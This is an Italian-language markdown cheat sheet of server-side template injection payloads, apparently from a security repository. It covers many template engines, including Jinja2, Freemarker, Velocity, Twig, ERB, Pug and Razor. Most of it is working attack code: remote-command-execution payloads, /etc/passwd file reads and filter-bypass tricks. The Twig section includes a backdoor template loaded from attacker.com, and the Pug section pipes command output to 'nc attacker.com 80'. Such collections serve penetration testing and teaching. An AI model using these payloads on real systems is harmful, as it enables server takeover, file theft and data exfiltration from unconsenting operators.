# 🔥 Raccolta di payload SSTI

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SSTI.tr.md) • [🇬🇷 Ελληνικά](SSTI.el.md)

> **Nota sugli esempi originali:** Un risultato 49 è un indizio da confermare, non una prova autonoma; può dipendere da riflessione, contesto o valutazione lato client. La moltiplicazione di stringhe non si comporta allo stesso modo in Jinja2 e Twig. Gli indici __mro__/__subclasses__ e le API dei motori dipendono da runtime, versione e configurazione; alcuni esempi sono storici o non validi nel contesto corrente. Il Razor originale usa cmd.exe con id, comando non standard di Windows.


```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Server-Side Template Injection (injection nei template lato server)
```

---

## 🔍 Payload di rilevamento

### Rilevamento universale
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> Se nella risposta compare `49` = presenza di SSTI secondo l'esempio originale!

### Identificare il motore di template
```
{{7*'7'}}         → Jinja2/Twig restituisce 7777777
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

## 🐍 Python (Jinja2)

### Rilevamento
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

### Payload per l'esecuzione di codice remoto
```python
# Metodo 1 - config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Metodo 2 - cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Metodo 3 - MRO (il più comune nell'originale)
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Metodo 4 - lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Metodo 5 - Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Leggere file
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

### Aggiramento dei filtri
```python
# Uso del filtro attr
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Uso del filtro join  
{%set x=''|join('')|attr('__class__')%}

# Codifica esadecimale
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

## ☕ Java (Freemarker)

### Rilevamento
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

### Payload per l'esecuzione di codice remoto
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Semplice
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

## 🌱 Java (Thymeleaf)

### Rilevamento
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Payload per l'esecuzione di codice remoto
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

## 🐦 PHP (Twig)

### Rilevamento
```php
{{7*7}}
{{7*'7'}}  → 7777777 (moltiplicazione di stringhe)
{{dump(app)}}
{{_self}}
```

### Payload per l'esecuzione di codice remoto
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

### Leggere file
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

## 💎 Ruby (ERB)

### Rilevamento
```ruby
<%= 7*7 %>
<%= self %>
```

### Payload per l'esecuzione di codice remoto
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

## 🟢 Node.js (Jade/Pug)

### Rilevamento
```javascript
#{7*7}
-var x = 1; p= x
```

### Payload per l'esecuzione di codice remoto
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

## 📊 Riferimento rapido

| Motore di template | Rilevamento | RCE |
|-----------------|-----------|-----|
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

## 🛡 Tecniche di aggiramento

### Parole chiave bloccate
```python
# Usa gli argomenti della richiesta
{{request.args.cmd}}?cmd=__class__

# Concatenazione di stringhe
{{''['__cla'+'ss__']}}

# Codifica esadecimale
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Parentesi quadre bloccate
```python
{%print(7*7)%}
```

---

## 📚 Risorse

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 Raccolta di payload SSTI</b><br>
  <i>Solo per scopi didattici!</i>
</p>
